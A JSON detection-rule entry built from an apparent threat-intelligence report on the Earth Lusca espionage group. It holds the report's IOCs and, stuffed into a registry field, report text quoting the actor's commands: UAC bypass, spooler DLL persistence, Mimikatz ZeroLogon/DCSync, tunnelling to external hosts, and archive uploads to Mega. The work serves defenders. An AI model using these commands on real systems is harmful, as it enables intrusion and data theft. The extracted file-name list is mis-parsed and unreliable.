{"rule_id": 916, "name": "technical-brief-delving-deep-an-analysis-of-earth-lusca-operations", "description": "-", "references": [], "File_Names": ["ADOWPAD.CGZ", "badpotato.exe", "Python.Re", "TRX.XXEL", "Win32.Fast", "Win64.FRP", "er.AD", "ELL.KEQW", "ner.CFI", "we.exe", "pwm.exe", "xs.exe", "WPAD.CGX", "Backdoor.Java", "Troj.ELF", "ADOWPAD.CGX", "HackTool.MSIL", "Win64.Fast", "HackTool.BAT", "Win32.Nb", "tScan.ZAIC", "mem_dll.pdb", "Linux.Proc", "23.The", "HackTool.SH", "Linux.WIN", "lzfhome.com", "wmi.vba", "Linux.GetS", "Win32.Eart", "frpc.ini", "CON.SVH", "ok.txt", "ADOWPAD.CGY", "Win64.FU", "Python.PS", "PUA.VBS", "Linux.WTm", "Win32.Juic", "Backdoor.ASP", "forfiles.exe", "fscanx86.exe", "hbs.exe", "spool.dll", "Backdoor.JS", "mimikatz32.exe", "CON.BU", "macoffe.pdb", "ts.php", "Win64.DOR", "Win64.SM", "mm.html", "Doraemon.dll", "Win32.SH", "by.bat", "Win32.FU", "vi.txt", "Dr.WEB"], "MD5_Hashes": [], "SHA1_Hashes": [], "SHA256_Hashes": ["6f258841a10be2543878dc8479098f8fe1752f4cbd7c29d6854f5329d0960e87", "4814e8baf52df7a17af3d88aba38d7bce4aed753a05b3d64478d4efedccc6625", "e6bad7f19d3e76268a09230a123bb47d6c7238b6e007cc45c6bc51bb993e8b46", "a72ea60be2adb8f15bbec86910dc1c1f41abe888fb87b1f3f902dcaa85e774f6", "4b8d15492687e46f939924a3a44b0f9b276229598433fb1380f8b6f46221416d", "82a0e722f6746d6f1db58b365c0f15da135bff170d2000858d6e345712ea8732", "7e35078106bd59b739b1d1fb6ad16d56c3adaf9f10d2e206a1b9b23d64b25cd0"], "Registry_Entries": ["HKEY_CURRENT_USER\\Environment\u201d /v UserInitMprLogonScript /t REG_SZ /d \u201c[file path]\u201d \n\nWe also noticed two other persistence techniques leveraging existing system services. First, we found the \nthreat actor placing their payload in the location \u201c%WINDIR%\\SYSTEM32\\oci.dll\u201d. The DLL file does not \nexist in the system by default but will be loaded by the MSDTC service. This allows the attacker to place \nan arbitrary payload that will be sideloaded by the MSDTC service. We reported the use of this technique \nin another APT attack research.  \n\nIn another incident, we saw the threat actor dropping their payload into \n\u201c%WINDIR%\\SYSTEM32\\spool\\prtprocs\\x64\\spool.dll\u201d and registering the DLL name as a Windows print \nprocessor. The payload was loaded by the Print Spooler service after the actor restarted the system \nservice \u201cspooler.\u201d A similar trick was reportedly being used by the \u201cPipeMon\u201d malware, as seen in the \nfollowing command: \n\nmove [file path] c:\\windows\\system32\\spool\\prtprocs\\x64\\spool.dll \n\n \n \n \n \n \n \n\freg add \u201cHKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print \nProcessors\\UDPrint\u201d /v Driver /d \u201cspool.dll\u201d /f \nsc stop spooler \nsc start spooler \n\nWe observed that the actor used the Fodhelper UAC bypass technique to gain elevated privileges via the \nfollowing commands: \n\nreg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\ /t REG_SZ /d \n\u201c%appdata%\\[file name]\u201d /f \nreg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\ /v \nDelegateExecute /t REG_SZ /d \u201c\u201d /f \nfodhelper.exe \nreg delete HKEY_CURRENT_USER\\Software\\Classes\\ms-settings /f \n\nWe also found the open-source tool BadPotato to be used Earth Lusca to gain higher privileges: \n\nC:\\ProgramData\\badpotato.exe whoami \n\nCredential Access \n\nTo gain greater access to the victim\u2019s internal network, the threat actor will first target user credentials. \nWe observed Earth Lusca using the procdump tool to obtain the hashes of these credentials by dumping \nthe memory of the lsass process which is a technique often  used by attackers. In additional, they used \nMimikatz to exploit the domain controller via the ZeroLogon exploit.  \n\nAfter a successful exploitation, the threat actor inputs a DCSync command with Mimikatz which allows the \ngroup to retrieve the credentials from the exploited controller: \n\nmimikatz32.exe \u201clsadump::zerologon /target:10.0.0.18 /account:[account name]$\u201d \u201cexit\u201d \nmimikatz32.exe \u201clsadump::zerologon /target:10.0.0.18 /account:[account name]$\u201d /exploit \u201cexit\u201d \nmimikatz32.exe lsadump::dcsync \u201eexit\u201c \n\nProxy \n\nEarth Lusca established network tunnels between the target\u2019s network and external servers. The external \nservers connected by these tunnels belong to the second cluster of servers we mentioned in the \n\u201cInfrastructure\u201d section. By matching the parameters of the commands, we were able to determine the \nproxy tools they used even after they renamed the binary. \n\nTool Name \nlcx \nfrp \n\nCommand \nxs.exe -connect [ip address] [port number] \nfrpc.exe -c frpc.ini \n\n \n \n \n \n \n \n \n \n \n\fEarthWorm \n\nwe.exe -s rssocks -d [ip address] -e [port number] \n\nTable 3. Proxy tools and observed commands \n\nExfiltration \n\nTo exfiltrate a large number of files from a target folder, we observed Earth Lusca using WinRAR to \ncompress the files into an archive and then using the megacmd tool to upload the archive to Mega \nservice. The megacmd tool is not an official one, nevertheless, setting up the tool is even easier than \nconfiguring the official tool, since only a simple json file with predefined credentials is needed, after which \nan attacker can place the tool on the victim\u2019s machine and upload it via the company network \u2014 making it \nsimilar, in a way, to DropBox or Google Drive. \n\nRar a -v3g -k -r -s -m3 [compressed file] [target path] \nmegacmd -conf [config] put [file] mega:[upload path] \n\nAdditional Findings  \n\nDuring investigation, we found that Earth Lusca loaded a PowerShell script from the GitHub repository \nyuibrun/hmm. A look into the repository revealed other attack tools as well as malware, including: \n\nJSP (Behinder), Perl (Gamma Web Shell), C# and PHP web shells \n\n\u2022 \n\u2022  Python scripts for port scanning or building reverse shells \n\u2022  A Visual Basic for Applications (VBA) script (wmi.vba) to execute Windows Management \n\nInstrumentation (WMI) \n\n\u2022  Exploit tools such as DirtyCow, SMBGhost and JuicyPotato \n\u2022  Cobalt Strike loaders and XMR miners \n\u2022  Winnti malware, loader, and the install script (Linux version) \n\nOne of the Cobalt Strike samples \n(4814e8baf52df7a17af3d88aba38d7bce4aed753a05b3d64478d4efedccc6625) found on the repository \nconnected to the C&C domain coivo2xo[.]livehost[.]live, which the group reportedly owns. The JSP web \nshell Behinder was also identified on compromised GlassFish servers, as mentioned in the server \nvulnerabilities subsection.   \n\nThe Linux version sample of Winnti (libxselinux) was also found on the repository, including the loader \n(libxselinux.so), and the install script (install). The threat actor was reported to have previously used the \nWinnti malware in their attacks. These clues point to the likelihood that Earth Lusca owns this repository. \n\n \n \n \n \n \n \n\fFigure 14. The GitHub repository hosting web shells, malware, and attack scripts \n\nMalware Analysis \n\nCobalt Strike Loader \n\nThe threat actor often employs penetration testing tools such as Cobalt Strike. Custom Cobalt Strike \nloaders were identified in attacks associated with Earth Lusca that were found to be delivered via spear \nphishing emails or watering hole attacks, typically involving documents or  applications. Once the user \nexecutes the loader, it will open the decoy document or the application that it pretends to be.  \n\nIn the background, however, it also downloads a Cobalt Strike shellcode that is XOR encoded with a XOR \nkey. We have observed different XOR keys being used in different loaders, including \u201cfish_master,\u201d \n\u201cfishdownload,\u201d and \u201cazdx64x64.\u201d Additional research found other encryption or encoding techniques \nused in their loaders to hide shellcode. \n\n\u25aa  XOR with single byte \n\u25aa  XOR with multi-bytes \n\u25aa  AES 256 \n\u25aa  DES \n\n \n \n \n \n\f\u25aa  Base64 \n\u25aa  Steganography \n\nIn the case of steganography, the loader downloads a BMP image file instead of an encoded shellcode. \nThe attacker then uses steganography to hide shellcode into an image. The loader then extracts it from \nthe picture to retrieve the Cobalt Strike shellcode. \n\nFigure 15. Steganography image contains randomly colored pixels at the bottom \n\nHere are the steps to extract the shellcode from the picture: The first step involves reading a DWORD \nvalue from the address 0x0A (the green text in figure 16), which tells the offset (bfOffBits) where the data \nstarts (blue text). It then moves a displacement value to bfOffBits \u2014 which was \u201c3\u201d in the cases we \nobserved. Starting with the byte at offset bfOffBits+3, this byte is part of the HEX value of the original \nshellcode (red text). It adds an interval value, which is \u201c4\u201d in this case. This byte is another part of the \nshellcode\u2019s HEX value (red text).  \n\nThe process will keep adding the interval value, eventually getting the HEX value to construct the original \nshellcode. We have also seen a variant of the process that subtracts each HEX value with the value \u201c1\u201d to \nobtain the original HEX value. \n\nFigure 16. An example of the shellcode inside the BMP image file \n\nFor Earth Lusca\u2019s more recent samples, the threat actor also started to use the \u201cMITRE \u2013 Hijack \nExecution Flow: DLL Side-Loading\u201d technique to leverage valid code-signed executions, for which the \nfollowing files are used: \n\n\u2022  e6bad7f19d3e76268a09230a123bb47d6c7238b6e007cc45c6bc51bb993e8b46 \n\u2022  7e35078106bd59b739b1d1fb6ad16d56c3adaf9f10d2e206a1b9b23d64b25cd0 \n\u2022  a72ea60be2adb8f15bbec86910dc1c1f41abe888fb87b1f3f902dcaa85e774f6 \n\u2022  4b8d15492687e46f939924a3a44b0f9b276229598433fb1380f8b6f46221416d \n\n \n \n \n \n \n \n \n \n\fDoraemon \n\nWhile this backdoor is already quite old, it is rarely discussed by the general public. Recently mentioned \nby ESET in their SideWalk report, we first encountered Doraemon around 2016 in incidents involving \nKorean and Taiwanese online gaming companies. It then disappeared from  view for about three years \nuntil we encountered it again in 2020. \n\nThe naming of the backdoor comes from the fact that it contains an original DLL filename Doraemon.dll, \n\nand the PDB strings \u201cD:\\\u8d44\u6599\\C++\\Doraemon\\x64\\Release\\mem_dll.pdb\u201d contained in the project name \n\nfrom an early version circa 2016. The name is originally from a Japanese manga series. \n\nThe backdoor usually contains two C&C settings, the first C&C setting being a primary one that is IP or \nDNS, while the second one is a public website URL that contains encrypted or clear text C&C IP \naddresses, so even if the first IP/C&Cs are blocked, the threat actor still has a way to achieve \npersistence. \n\nFigure 17. Encrypted and clear text C&C IP addresses  \n\nIt\u2019s not clear how Earth Lusca delivered this backdoor to victims. Nevertheless, we found two samples \nconnected to C&C domains that belong to Earth Lusca\u2019s infrastructure. \n\nFunnySwitch \n\nFunnySwitch is a .NET Framework backdoor that usually starts with the \u201cMITRE \u2013 Hijack Execution \nFlow: DLL Search Order Hijacking\u201d technique and executes inside a legal process that was mentioned \nand analyzed by Positive Technologies in 2020.  \n\nMost known samples are placed in C:\\Windows\\System32\\oci.dll, which starts with msdtc.exe.  However, \nwe recently found new samples that leverage the signed McAfee executable file \n(e6bad7f19d3e76268a09230a123bb47d6c7238b6e007cc45c6bc51bb993e8b46).  \n\nThese new DLL files both contain a unique PDB string:  \n\n\u2022  E:\\VS2019_Project\\while_dll_ms\\whilte\\x64\\Release\\macoffe.pdb \n\nWe have found and checked two similar DLL files, with one supporting payload encryption, and another \nthat does not.  \n\n \n \n \n \n \n \n \n \n\fFigure 18. The decryption function \n\nThe time stamp is only slightly different \u2014 around 9 days \u2014 but the entry function has changed, which \nmeans development is very active and the backdoor is rapidly being evolved. \n\n \n \n \n \n  \n\fFigure 19. Bindiff view of the entry function; \n82a0e722f6746d6f1db58b365c0f15da135bff170d2000858d6e345712ea8732 (right) and \n6f258841a10be2543878dc8479098f8fe1752f4cbd7c29d6854f5329d0960e87 (left) \n\nShadowPad \n\nShadowPad is a malware family that was discovered in 2017 and eventually used in high-profile supply \nchain attacks. While it was initially used solely by APT41, it started being shared among multiple Chinese \nthreat actors in 2019. \n\nIn the case of Earth Lusca, the malware has the same features, but they added an extra layer of \nobfuscation, making it very different from the Shadowpad samples used by other groups.  \n\nIn this case, the ShadowPad samples are composed of three components: a valid code signed \nexecutable, a DLL loader, and an encrypted payload. \n\nThe obfuscation technique used by ShadowPad has previously been described: a function is called \nbefore each instruction, which will redirect the code flow to the next instruction, making it very difficult to \nfollow. In addition, some useless comparisons are added to overload the code. \n\nThe DLL loader is obfuscated. Its role is to search and load the payload file, which is obfuscated in the \nsame manner as the DLL file. If the payload file is found, its code is copied to the registry and the file is \ndeleted. The next time it runs, the payload will be loaded from the registry. This way, it is not possible to \nrecover the final payload using only the DLL loader and without the registry content. Some of the \ndecrypted configurations we found contained the \u201cmm_telecom\u201d keyword, which might indicate a possible \ntarget.  \n\nWe have seen ShadowPad samples dropped by Cobalt Strike infections distributed by Earth Lusca to its \nvictims. \n\nWe observed the same behavior for ShadowPad C&C servers that move rapidly. \n\nDate  \nMay 18, 2021 \nJul 20, 2021 \nAug 31, 2021 \nSep 7, 2021 \n\nWinnti \n\nIP \n139.180.135[.]175 \n207.148.76[.]26 \n149.28.156[.]173 \n156.240.107[.]248 \nTable 4. Resolve History for 6czumi0fbg.symantecupd[.]com \n\nISP \nVultr \u2013 German \nVultr \u2013 Singapore \nVultr \u2013 Singapore \nUDC \u2013 Hong Kong \n\nWinnti for Linux is a copy of the open-source userland rootkit Azazel with some modifications that was \nresearched and published in detail in 2019. Designed to work with the TreadStone controller, the \nbackdoor existed under the radar of security vendors for years because it was installed on Linux \nmachines that lacked security solutions \u2014 either due to a lack of options or because the machine\u2019s owner \nwanted to reduce performance hits in a production environment.  \n\n \n \n \n \n\fMiners \n\nWe also found several miner programs, installation scripts, and machine lists in Earth Lusca\u2019s GitHub \nrepository, the primary cryptocurrency target being Monero (XMR). \n\nFigure 20. The shell script to launch the cryptocurrency miner  \n\n\u2022  by.bat \u2013 XMR installation Scripts  \n\u2022  ok.txt \u2013 Victim machine lists \n\u2022  pwm.exe \u2013 XMR Miner \n\u2022  wmi.vbs \u2013 WMI EXEC Vbscript \n\nFurther analysis shows that the threat actors install the miner on the victim\u2019s machine to earn money. At \nfirst glance, the revenue earned from the mining activities seem low. However, it also shows the victim\u2019s \nActive Directory being compromised.   \n\nFigure 21. The cryptocurrency miner\u2019s dashboard \n\n \n \n \n \n \n \n \n\fOthers \n\nBased on the information we found in the GitHub repository, we know that Earth Lusca uses multiple web \nshells that are written in several languages such as JSP, PHP, Perl, C# and ASPX. Despite their \ndifferences, these web shells are all designed to get the job done.  \n\nThe following subsections will briefly cover a couple of web shell management tools that the group uses. \n\nAntSword \n\nAntSword is a successor of the China Chopper web shell that integrates more features compared to other \nweb shell management tools. Perhaps its unique selling point is its plugin store, where a user can \nenhance its functions via additional plugins.  \n\nFigure 22. AntSword\u2019s plugin store \n\nBehinder \n\n \n \n \n \n \n \n \n\fBehinder is a web shell management toolkit that encrypts traffic \u2014 making it stand out from other web \nshell management tools, Encrypted payloads are more difficult for web application firewalls or intrusion \nprevention systems to discover.   \n\nFigure 23.The Behinder UI \n\nAttribution \n\nIn January 2020, ESET reported a new campaign targeting universities in Hong Kong with both Winnti \nand a new ShadowPad variant. On May 21, 2020, few domains related to the same cluster of \ninfrastructure used in this campaign were listed as the indicators in an FBI alert mentioning that nation-\nstate threat actors were targeting US organizations conducting Covid-19 research.  \n\nPositive Technologies released a report sharing the analysis of a new malware called FunnySwitch, \nwhich possibly originated from the same developers of the Crosswalk malware: the C&C domains of \nFunnySwitch could connect to the infrastructure of the same campaign. Another report released by \nDr.WEB in March 2021 identified another malware called Spyder, which also used the same associated \nC&C infrastructure. \n\nIn April 2021, the NTT Group published a report of a campaign that deployed Cobalt Strike and Acunitex \non compromised GlassFish servers to perform targeted attacks. The report addressed the activity \noverlaps with aforementioned ESET and Dr.WEB\u2019s reports. A few months later, in July 2021, Avast \nreported that the website of a Mongolian certification authority was compromised to distribute Cobalt \nStrike binaries associated with the indicators described in the NTT Group\u2019s report. Recorded Future \nreported the same cluster of activity later on and gave a temporary name to this campaign (TAG-22). \n\nIn July 2021, we published a report on a new malware called BIOPASS RAT. The malware was loaded by \nloaders that have the same PDB string reported in both the NTT Group and Avast\u2019s reports.  \n\n \n \n \n \n\fMore recently, PwC published an extensive analysis of the ShadowPad variant (32 bit version) that Earth \nLusca used. \n\nFigure 24. Research and reports related to Earth Lusca \n\nThe earlier research done on these activities initially attributed it to the Winnti Group since the malware \nused in the campaigns included Winnti and ShadowPad (reported to be associated with the Winnti \nGroup). As more details emerged, however, it became clear that the TTP and the infrastructure differ from \nthose used by any subcluster under the Winnti umbrella.  \n\nMore recent reports consider it to be another cluster of activities under the name TAG-22 or Fishmonger. \nWe decided to separate the cluster as an independent campaign and named it Earth Lusca. \n\nThe term Winnti has evolved since it first hit public consciousness in 2013. While it was initially \ndesignated as both a tool and its associated threat actor, the research community has begun to consider \nthe term \u201cWinnti\u201d as one that no longer refers to a single threat actor, but encompasses several different \ngroups originating from the same country and possibly sharing parts of their code, tools and TTP.  \n\nWe can conclude with medium confidence that Earth Lusca is part of the Winnti cluster, but we prefer to \nstate the facts and consider it as a single threat actor. \n\nConclusion \n\nEarth Lusca is a cyberespionage campaign that targets high value organizations around the world via \nspear phishing or watering hole attacks using tried and true social engineering techniques. One of their \nmotivations is financial gain, as evidenced by their targeting of gambling and cryptocurrency companies. \nFurthermore, the group also targets public-facing servers through the exploitation of known vulnerabilities \nin servers that are running out-of-date versions of applications. Earth Lusca also used vulnerability \nscanning tools to discover possible vulnerabilities inside the websites of targeted victims.  \n\n \n \n \n \n \n\fThe infection vectors used by the group shows the importance of applying security best practices such as \nproper vetting of emails and websites being visited, as well as constantly updating software to their latest \nsecurity iterations to minimize the chances of vulnerability exploitation. \n\nFurthermore, advanced and versatile security technologies such as Trend Micro XDR can help defend \norganizations from threat actors such as Earth Lusca by collecting and correlating activity data across \nmultiple vectors \u2014 from emails and endpoints to servers, cloud workloads, and networks \u2014 enabling a \nlayer of security detection and investigation that cannot be matched by traditional security solutions. \n\nAppendix A. MITRE ATT&CK \n\nReconnaissance \n\nResource \nDevelopment \n\nInitial \nAccess \n\nExecution \n\nPersistence \n\nActive Scanning \n\nAcquire \nInfrastructure \n\nDrive-by \nCompromise \n\nCommand and \nScripting \nInterpreter \n\nAccount \nManipulation \n\nGather Victim \nHost Information \n\nCompromise \nAccounts \n\nExploit \nPublic-\nFacing \nApplication \n\nDeploy \nContainer \n\nBITS Jobs \n\nGather Victim \nIdentity \nInformation \n\nCompromise \nInfrastructure \n\nExternal \nRemote \nServices \n\nScheduled \nTask/Job \n\nCreate \nAccount \n\nPrivilege \nEscalation \n\nAbuse \nElevation \nControl \nMechanism \n\nCreate or \nModify \nSystem \nProcess \n\nHijack \nExecution \nFlow \n\nDefense Evasion \n\nCredential \nAccess \n\nDiscovery \n\nLateral \nMovement \n\nCollection \n\nCommand \nand \nControl \n\nExfiltration \n\nAbuse Elevation \nControl Mechanism \n\nBrute \nForce \n\nAccount \nDiscovery \n\nExploitation of \nRemote \nServices \n\nArchive \nCollected \nData \n\nApplication \nLayer \nProtocol \n\nExfiltration \nOver C2 \nChannel \n\nBITS Jobs \n\nCredentials \nfrom \nPassword \nStores \n\nFile and \nDirectory \nDiscovery \n\nInternal \nSpearphishing \n\nDeobfuscate/Decode \nFiles or Information \n\nOS \nCredential \nDumping \n\nNetwork \nService \nScanning \n\nData from \nLocal \nSystem \n\nData from \nNetwork \nShared \nDrive \n\nData \nObfuscation \n\nTransfer \nData to \nCloud \nAccount \n\nEncrypted \nChannel \n\nGather Victim \nNetwork \nInformation \n\nObtain \nCapabilities \n\nPhishing \n\nSystem \nServices \n\nCreate or \nModify \nSystem \nProcess \n\nScheduled \nTask/Job \n\nDeploy Container \n\nSteal \nApplication \nAccess \nToken \n\nNetwork \nShare \nDiscovery \n\nEmail \nCollection \n\nNon-\nStandard \nPort \n\nGather Victim Org \nInformation \n\nStage \nCapabilities \n\nSupply \nChain \nCompromise \n\nWindows \nManagement \nInstrumentation \n\nExternal \nRemote \nServices \n\nValid \nAccounts \n\nHide Artifacts \n\nUnsecured \nCredentials \n\nQuery \nRegistry \n\nScreen \nCapture \n\nProtocol \nTunneling \n\nPhishing for \nInformation \n\nValid \nAccounts \n\nSearch Closed \nSources \n\nSearch Open \nTechnical \nDatabases \n\nSearch Open \nWebsites/Domains \n\nSearch Victim-\nOwned Websites \n\nHijack \nExecution \nFlow \n\nScheduled \nTask/Job \n\nValid \nAccounts \n\nHijack Execution \nFlow \n\nImpair Defenses \n\nModify Registry \n\nSigned Binary Proxy \nExecution \n\nValid Accounts \n\nRemote \nSystem \nDiscovery \n\nSystem \nNetwork \nConnections \nDiscovery \n\nProxy \n\nRemote \nAccess \nSoftware \n\nReconnaissance \n\n\u2022  Active Scanning \n\u2022  Gather Victim Host Information \n\u2022  Gather Victim Identity Information \n\u2022  Gather Victim Network Information \n\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\f\u2022  Gather Victim Org Information \n\u2022  Phishing for Information \n\u2022  Search Closed Sources \n\u2022  Search Open Technical Databases \n\u2022  Search Open Websites/Domains \n\u2022  Search Victim-Owned Websites \n\nResource Development \n\n\u2022  Acquire Infrastructure \n\u2022  Compromise Accounts \n\u2022  Compromise Infrastructure \n\u2022  Obtain Capabilities \n\u2022  Stage Capabilities \n\nInitial Access \n\n\u2022  Drive-by Compromise \n\u2022  Exploit Public-Facing Application \n\u2022  External Remote Services \n\u2022  Phishing \n\u2022  Supply Chain Compromise \n\u2022  Valid Accounts \n\nExecution \n\n\u2022  Command and Scripting Interpreter \n\u2022  Deploy Container \n\u2022  Scheduled Task/Job \n\u2022  System Services \n\u2022  Windows Management Instrumentation \n\nPersistence \n\n\u2022  Account Manipulation \n\u2022  BITS Jobs \n\u2022  Create Account \n\u2022  Create or Modify System Process \n\u2022  External Remote Services \n\u2022  Hijack Execution Flow \n\u2022  Scheduled Task/Job \n\u2022  Valid Accounts \n\nPrivilege Escalation \n\n\u2022  Abuse Elevation Control Mechanism \n\u2022  Create or Modify System Process \n\u2022  Hijack Execution Flow \n\u2022  Scheduled Task/Job \n\n \n \n \n \n \n \n\f\u2022  Valid Accounts \n\nDefense Evasion \n\n\u2022  Abuse Elevation Control Mechanism \n\u2022  BITS Jobs \n\u2022  Deobfuscate/Decode Files or Information \n\u2022  Deploy Container \n\u2022  Hide Artifacts \n\u2022  Hijack Execution Flow \n\u2022 \nImpair Defenses \n\u2022  Modify Registry \n\u2022  Signed Binary Proxy Execution \n\u2022  Valid Accounts \n\nCredential Access \n\n\u2022  Brute Force \n\u2022  Credentials from Password Stores \n\u2022  OS Credential Dumping \n\u2022  Steal Application Access Token \n\u2022  Unsecured Credentials \n\nDiscovery \n\n\u2022  Account Discovery \n\u2022  File and Directory Discovery \n\u2022  Network Service Scanning \n\u2022  Network Share Discovery \n\u2022  Query Registry \n\u2022  Remote System Discovery \n\u2022  System Network Connections Discovery \n\nLateral Movement \n\n\u2022  Exploitation of Remote Services \n\u2022 \n\nInternal Spearphishing \n\nCollection \n\n\u2022  Archive Collected Data \n\u2022  Data from Local System \n\u2022  Data from Network Shared Drive \n\u2022  Email Collection \n\u2022  Screen Capture \n\nCommand and Control \n\n \n \n \n \n \n \n \n\f\u2022  Application Layer Protocol \n\u2022  Data Obfuscation \n\u2022  Encrypted Channel \n\u2022  Non-Standard Port \n\u2022  Protocol Tunneling \n\u2022  Proxy \n\u2022  Remote Access Software \n\nExfiltration \n\n\u2022  Exfiltration Over C2 Channel \n\u2022  Transfer Data to Cloud Account \n\nAppendix B. Indicators of Compromise \n\nDoraemon  \n\nFiles \n\nSHA256 \n\nNote \n\nDetection \n\nTrendX \n\nDoraemon backdoor \n\nBackdoor.Win64.DOR\nAEMON.A \n\nTroj.Win32.TRX.XXP\nE50FFF036 \n\nDoraemon backdoor \n\nBackdoor.Win64.DOR\nAEMON.A \n\nN/A \n\n2d3699607194d1a2a\n6c1eeeb5d0e5e5e38\n5b78d94d5053e38e3\nc1908c5ced1c6 \n95aa15baeef978b99e\n63a406fa06a1197f6f7\n62047f9729f17bb49b\n72ead6477 \n\nC&C server \n\nDNS server \ndsyu.livehost[.]live \ndust.dnslookup[.]services \nhttp://www.akiyaku[.]jp/images/images/mm.html \nhttp://www.n[.]co/1/1/1/1 \n\nCobalt Strike \n\n \n \n \n \n \n \n \n \n \n \n \n\fFiles \n\nSHA256 \n46aedd46f54967c9c9\ndbfabc04237a480898\n1086d94c5fd5482a5d\n42e34d8b1f \nd71a7b1efc4a06afffd\n94f526ad496368a9c4\n489296076449c74eec\n2d76ee4ca \n6a4e32229e5ca41e8\neca99cefe5beef3e362\n1c2199f8844b4d218c\n14b5481534 \n8be8a6f8fe7c182a50\n17040aa8c8cfc9cefbc\nf8f3d1be932c7e7101\n01c34d57e \n82a0e722f6746d6f1d\nb58b365c0f15da135b\nff170d2000858d6e34\n5712ea8732 \nc6a027d3c7e4734e4c\nf62741f7fb58f225dcb\n5ad36af75c6e19a4e3\nd870294e8 \n28c9a18366475de99f\n5959750e2f3c526668\nbee78af3419c646a51\n4eecaeebbd \nd36deb308bd61d31d\n919d4d77f5c12ac108\n042da9b9301678859\n229e2fc891e1 \n44fa4d2db0b68a0638\ne0d28594fd446ef261\n5755c9fc001e7e2e80f\neea3052ae \n93956d3ebb0614ff5c\n959bed7edaf4f3f41df\n4538468de0f84f3e27\nb8e3bde49 \n5e9d0dc03f725337ec\n3e2a426d982563ff2e\nc0232c829325599e72\n1d4307bb9a \n586dc1eb6e9f910e3c\nba04f80ad6ce61abfe\n\nNote \nCobalt Strike dropper  Trojan.Win64.COBEA\n\nDetection \n\nCON.SVH \n\nTrendX \nTrojan.Win64.COBEA\nCON.SVH \n\nCobalt Strike dropper  Trojan.Win64.COBAL\n\nTSTRIKE.H \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win32.COBEA\nCON.BU \n\n N/A \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.H \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.H \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win32.COBEA\nCON.BU \n\n N/A \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.I \n\n Ransom.Win32.TRX.\nXXPE50FFF051 \n\nCobalt Strike \n\nTrojan.Win64.COBEA\nCON.SVH \n\n TROJ.Win32.TRX.XX\nPE50FFF051 \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.H \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.H \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win32.COBEA\nCON.BU \n\n N/A \n\nCobalt Strike \n\nTrojan.Win32.COBEA\nCON.BU \n\n N/A \n\n \n \n \n\f523f93f09b7188afd3c\n780bf81fe \n7fd30094c50e324431\nfd913076c46ccd722b\na2eb5a670d129e3fd3\nf45c124383 \n2fe174c17383598025\nc3af714cbd4807ed5e\nac3ba17b1ac444794d\ne6650bc188 \nafead6dc93f0a64c68b\n091420d9b88455041\n8e9322109d483eb62\n5e7694f8105 \n8559fe618ca3841b9f\n541a034393cfe8b454\n751fb99791c4c6de1b\n20ac08d803 \n4814e8baf52df7a17af\n3d88aba38d7bce4ae\nd753a05b3d64478d4\nefedccc6625 \n2409047d04b8d3317\n710eca9e5d97e56a5\n210b07781903b2f2dc\n29358c1d4c56 \n171403ea31eb670cc2\n40305dfda802f06f013\n39587ae02384f9d3b0\n1720432c7 \n2e8652950932b5f3e8\n901b125d4198b2cae\n3abde50dcf072e77c7\n88c0f76b43a \n9d514cdf1db58f7eef4\n0a7bea52c9e646b5d\nb0f81ed2809caed9a6\n8b97665d99 \n66667b60335239906\n9facd78a6d8903f40b\n5c6e6cfaafb924873b0\ne590f2a696 \n9a73700d5c704c884c\nb9c905b4e4dfdf299a\nde57eba52801ae1d0\n76137cff552 \n2ca332d56d0e032be\n324b6ed2c014f4edf9c\nfa328bc5ac61e5434c\n9ddf7c17b6 \n\nCobalt Strike \n\nTrojan.Win32.COBEA\nCON.BU \n\n N/A \n\nCobalt Strike \n\nTrojan.Win32.COBAL\nSTRIKE.F \n\n Troj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win32.COBAL\nTSTRIKE.E \n\n Troj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win32.COBAL\nTSTRIKE.E \n\n Troj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.H \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.I \n\n TROJ.Win32.TRX.XX\nPE50FFF051 \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.I \n\n N/A \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.I \n\n Troj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.I \n\n Troj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win32.COBAL\nTSTRIKE.F \n\n Troj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win32.COBAL\nTSTRIKE.F \n\n N/A \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.H \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\n \n\f7f40b8c0d45d7290fb\n55552e7da28bec2efa\n8797ab13662f62bb72\nc74cb7dc01 \n89c0b2036ce8d1d91f\n6d8b8171219aafcd62\n37c811770fa16edf92\n2cedfecc54 \n97b2f7ef4132f27c615\ncec5fb75f8849b4576f\n5d6d1d11110743975\n96c946b8d \naeb4a8f6115bbba855\n13ded12a9c31a00e4\ne3a60ae501fbbf4351\n0782289fe92 \nd9cfc3b7544927a2d5\nd56f0d4767b88b83a9\n1616aa3b0a4a1846fd\n7881a4e0f9 